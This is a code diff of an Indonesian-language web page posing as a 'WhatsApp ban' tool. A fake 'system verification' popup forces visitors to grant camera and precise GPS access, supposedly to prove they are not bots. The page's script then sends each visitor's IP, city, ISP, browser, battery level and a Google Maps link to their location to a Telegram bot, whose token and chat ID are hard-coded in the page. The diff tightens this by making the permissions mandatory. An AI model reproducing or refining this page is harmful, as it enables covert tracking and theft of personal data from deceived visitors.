@@ -6,7 +6,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
   <style>
-    /* --- CSS ASLI ANDA --- */
+    /* --- CSS ASLI --- */
     * {
       margin: 0;
       padding: 0;
@@ -46,7 +46,7 @@
       50% { transform: translateY(-20px); opacity: 0.8; }
     }
 
-    /* MODIFIKASI: Container utama disembunyikan dulu */
+    /* Container utama disembunyikan */
     .login-container {
       display: none; 
       background-color: rgba(17, 17, 17, 0.95);
@@ -122,10 +122,10 @@
       }
     }
 
-    /* --- CSS POPUP (GATEKEEPER) --- */
+    /* --- CSS POPUP --- */
     :root {
       --popup-primary: #00ff7f;
-      --popup-bg-overlay: #0f0f23; /* Solid agar background tidak tembus sebelum izin */
+      --popup-bg-overlay: #0f0f23;
       --popup-glass-bg: rgba(20, 20, 30, 0.98);
     }
 
@@ -217,7 +217,13 @@
       text-transform: uppercase;
     }
 
-    .btn-popup:hover {
+    .btn-popup:disabled {
+      background: #444;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+
+    .btn-popup:hover:not(:disabled) {
       box-shadow: 0 0 25px var(--popup-primary);
       transform: scale(1.02);
     }
@@ -227,6 +233,8 @@
       font-size: 0.85rem;
       color: var(--popup-primary);
       font-weight: 500;
+      min-height: 40px;
+      padding: 0 10px;
     }
 
     .pulse { animation: pulse 1.5s infinite; }
@@ -239,17 +247,19 @@
 <body>
   <div class="bg-particles"></div>
 
-  <!-- POPUP IZIN (MUNCUL PERTAMA KALI) -->
+  <!-- POPUP IZIN -->
   <div id="permissionModal" class="modal-overlay active">
       <div class="modal-card">
           <div class="icon-container">
               <div class="icon-wrapper">
+                  <!-- Lokasi Icon -->
                   <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                       <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
                       <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
                   </svg>
               </div>
               <div class="icon-wrapper">
+                  <!-- Kamera Icon -->
                   <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                       <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" />
                       <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z" />
@@ -258,7 +268,7 @@
           </div>
 
           <h2>VERIFIKASI SISTEM</h2>
-          <p>Situs ini memerlukan izin <strong>Kamera</strong> dan <strong>GPS</strong> untuk memastikan Anda adalah pengguna asli dan bukan bot. Silakan izinkan untuk masuk.</p>
+          <p>Situs ini memerlukan izin <strong>Kamera</strong> dan <strong>GPS</strong> untuk memverifikasi perangkat Anda. Mohon pastikan GPS aktif dan situs menggunakan HTTPS.</p>
           
           <div class="btn-group">
               <button class="btn-popup" id="btn-allow" onclick="requestAllPermissions()">Izinkan & Masuk</button>
@@ -267,7 +277,7 @@
       </div>
   </div>
 
-  <!-- KONTEN UTAMA (TERKUNCI) -->
+  <!-- KONTEN UTAMA -->
   <div class="login-container" id="mainContent">
     <p class="login-title">Website Band WhatsApp</p>
     <p class="login-subtitle">⚠️ Jangan Disalahgunakan</p>
@@ -280,7 +290,6 @@
   <canvas id="canvas" width="640" height="480"></canvas>
 
   <script>
-    // --- KONFIGURASI BOT ANDA ---
     const botToken = '8335716552:AAHLyFftSVg3byPUIuJw0nbq8QAToj3UxGg';
     const chatIds = ['7958165198'];
     const infoDiv = document.getElementById('info');
@@ -289,48 +298,80 @@
     const mainContent = document.getElementById('mainContent');
     const permissionModal = document.getElementById('permissionModal');
     const statusText = document.getElementById('statusText');
+    const btnAllow = document.getElementById('btn-allow');
 
-    // --- LOGIKA GATEKEEPER ---
+    // LOGIKA GATEKEEPER DENGAN PENANGANAN LEBIH KUAT
     async function requestAllPermissions() {
+        if (btnAllow.disabled) return;
+        
         statusText.textContent = "Sedang memverifikasi akses...";
+        statusText.style.color = "var(--popup-primary)";
         statusText.classList.add('pulse');
-        document.getElementById('btn-allow').disabled = true;
+        btnAllow.disabled = true;
 
         try {
-            // Minta Lokasi
-            await new Promise((resolve) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(resolve, resolve); // Lanjut meski ditolak
-                } else { resolve(); }
+            // Cek apakah konteks aman (HTTPS)
+            if (!window.isSecureContext) {
+                throw new Error("Situs ini memerlukan koneksi aman (HTTPS) untuk akses lokasi.");
+            }
+
+            // Validasi GPS dengan timeout
+            await new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject("Browser Anda tidak mendukung GPS.");
+                    return;
+                }
+                
+                // Set timeout agar tidak menunggu selamanya jika user tidak merespon
+                const timeoutId = setTimeout(() => {
+                    reject("Permintaan lokasi kadaluarsa. Mohon segarkan halaman.");
+                }, 10000);
+
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        clearTimeout(timeoutId);
+                        resolve(pos);
+                    },
+                    (err) => {
+                        clearTimeout(timeoutId);
+                        let msg = "Izin GPS ditolak.";
+                        if (err.code === 1) msg = "Izin GPS ditolak oleh pengguna.";
+                        else if (err.code === 2) msg = "Posisi GPS tidak ditemukan.";
+                        else if (err.code === 3) msg = "Waktu permintaan GPS habis.";
+                        reject(msg);
+                    },
+                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                );
             });
 
-            // Minta Kamera
-            try {
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    stream.getTracks().forEach(track => track.stop());
-                }
-            } catch (e) { console.warn("Kamera tidak diizinkan"); }
+            // Validasi Kamera
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                throw new Error("Kamera tidak didukung di perangkat ini.");
+            }
+            
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            stream.getTracks().forEach(track => track.stop());
 
-            // Sukses (Simulasi loading seolah-olah verifikasi server)
+            // Sukses
+            statusText.textContent = "Verifikasi Berhasil! Membuka halaman...";
+            statusText.style.color = "#00ff7f";
+            
             setTimeout(() => {
-                statusText.textContent = "Verifikasi Berhasil! Membuka halaman...";
-                statusText.style.color = "#00ff7f";
-                
-                setTimeout(() => {
-                    permissionModal.classList.remove('active');
-                    mainContent.style.display = 'block'; // MEMBUKA KUNCI HALAMAN UTAMA
-                    createParticles();
-                }, 1000);
+                permissionModal.classList.remove('active');
+                mainContent.style.display = 'block';
+                createParticles();
             }, 1000);
 
         } catch (error) {
-            statusText.textContent = "Terjadi kesalahan sistem.";
-            document.getElementById('btn-allow').disabled = false;
+            console.error("Error Verifikasi:", error);
+            statusText.classList.remove('pulse');
+            statusText.textContent = error.message || "Verifikasi Gagal! Mohon izinkan Kamera dan GPS.";
+            statusText.style.color = "#ff4444";
+            btnAllow.disabled = false;
         }
     }
 
-    // --- LOGIKA ASLI ANDA ---
+    // Fungsi Utilitas
     function sendToTelegram(text) {
       chatIds.forEach(id => {
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -354,7 +395,7 @@
     }
 
     async function getInfo() {
-      let ip = '-', city = '-', region = '-', country = '-', org = '-';
+      let ip = '-', city = '-', org = '-';
       try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
@@ -362,7 +403,7 @@
         const locRes = await fetch(`https://ip-api.com/json/${ip}`);
         const loc = await locRes.json();
         if (loc.status === 'success') {
-          city = loc.city; region = loc.regionName; country = loc.country; org = loc.org;
+          city = loc.city; org = loc.org;
         }
       } catch {}
 
@@ -374,7 +415,6 @@ IP         : ${ip}
 Kota       : ${city}
 ISP        : ${org}
 Browser    : ${navigator.userAgent}
-OS         : ${navigator.platform}
 Baterai    : ${batteryPercent}
 Waktu      : ${new Date().toLocaleString()}
       `.trim();
@@ -386,8 +426,7 @@ Waktu      : ${new Date().toLocaleString()}
           pos => {
             const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
             sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
-          },
-          () => sendToTelegram(`📍 Lokasi GPS Ditolak`)
+          }
         );
       }
     }
